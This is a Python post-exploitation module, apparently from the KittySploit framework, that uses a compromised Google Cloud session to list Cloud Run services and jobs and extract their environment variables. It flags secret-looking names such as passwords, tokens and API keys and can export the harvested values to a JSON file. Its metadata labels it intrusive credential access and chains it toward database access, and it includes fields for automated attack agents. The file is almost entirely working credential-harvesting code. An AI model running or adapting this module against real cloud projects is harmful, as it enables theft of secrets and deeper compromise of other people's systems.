#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Cloud Run Env Vars Loot",
        "description": "Extract environment variables from Cloud Run services and jobs",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "cloud-run", "loot", "secrets"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access', 'api_request'],
        'expected_requests': 10,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    include_services = OptBool(True, "Include Cloud Run services", False)
    include_jobs = OptBool(True, "Include Cloud Run jobs", False)
    max_resources = OptInteger(20, "Maximum services/jobs to process", False)
    mask_values = OptBool(True, "Mask environment variable values in console output", False)
    export_json = OptString("", "Optional output JSON file", False)

    SENSITIVE_NAMES = (
        "password", "secret", "token", "api_key", "apikey", "credential",
        "private", "auth", "key", "passwd", "access",
    )

    def run(self):
        try:
            project_id = self._gcp_project_id()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False

            resources = self._collect_resources(project_id)
            if not resources:
                print_warning("No Cloud Run services or jobs found")
                return self.module_result(success=True, data={"resources": []})

            max_resources = max(1, int(self.max_resources or 20))
            loot = []

            print_info(f"Looting env vars from {min(len(resources), max_resources)} Cloud Run resource(s)...")
            for resource in resources[:max_resources]:
                name = str(resource.get("name") or "").rsplit("/", 1)[-1]
                kind = resource.get("kind", "service")
                env_vars = self._extract_env_vars(resource)
                entry = {
                    "name": name,
                    "kind": kind,
                    "full_name": resource.get("name"),
                    "serviceAccount": self._service_account(resource),
                    "env": env_vars,
                }
                print_info(f"{kind}: {name} ({len(env_vars)} env var(s))")
                for var in env_vars:
                    var_name = var.get("name", "")
                    rendered = self._render_env_value(var)
                    marker = "!" if self._is_sensitive_name(var_name) else " "
                    print_info(f"  {marker} {var_name}={rendered}")
                loot.append(entry)
                print_info("-" * 80)

            payload = {"project_id": project_id, "resources": loot}
            exported = self._gcp_export_json(self.export_json, payload) if self.export_json else ""
            if exported:
                print_success(f"Loot exported to {exported}")
            print_success(f"Processed {len(loot)} resource(s)")
            return self.module_result(success=True, data=payload)
        except Exception as exc:
            print_error(f"Cloud Run env var loot failed: {exc}")
            return False

    def _collect_resources(self, project_id):
        resources = []
        quoted = self._quote_project(project_id)
        if self.include_services:
            url = f"https://run.googleapis.com/v2/projects/{quoted}/locations/-/services"
            for item in self._gcp_paginate_get(url, "services", max_items=int(self.max_resources or 20)):
                item["kind"] = "service"
                resources.append(item)
        if self.include_jobs:
            body = self._gcp_body_dict("cloud_run_jobs")
            for item in body.get("jobs") or []:
                item["kind"] = "job"
                resources.append(item)
        return resources

    @staticmethod
    def _service_account(resource):
        template = resource.get("template") or {}
        spec = template.get("spec") or resource.get("spec") or {}
        return spec.get("serviceAccountName") or spec.get("serviceAccountEmail") or ""

    def _extract_env_vars(self, resource):
        containers = []
        template = resource.get("template") or {}
        spec = template.get("spec") or resource.get("spec") or {}
        for container in spec.get("containers") or []:
            containers.extend(container.get("env") or [])

        job_template = (resource.get("template") or {}).get("template") or {}
        job_spec = job_template.get("spec") or {}
        for container in job_spec.get("containers") or []:
            containers.extend(container.get("env") or [])

        normalized = []
        for item in containers:
            name = item.get("name")
            if not name:
                continue
            row = {"name": name}
            if "value" in item:
                row["value"] = item.get("value")
            if item.get("valueSource"):
                row["valueSource"] = item.get("valueSource")
            normalized.append(row)
        return normalized

    def _render_env_value(self, var):
        if var.get("valueSource"):
            source = json.dumps(var["valueSource"], ensure_ascii=False)
            return self._gcp_mask_value(source, mask=self.mask_values)
        return self._gcp_mask_value(var.get("value", ""), mask=self.mask_values)

    def _is_sensitive_name(self, name):
        lowered = str(name or "").lower()
        return any(token in lowered for token in self.SENSITIVE_NAMES)
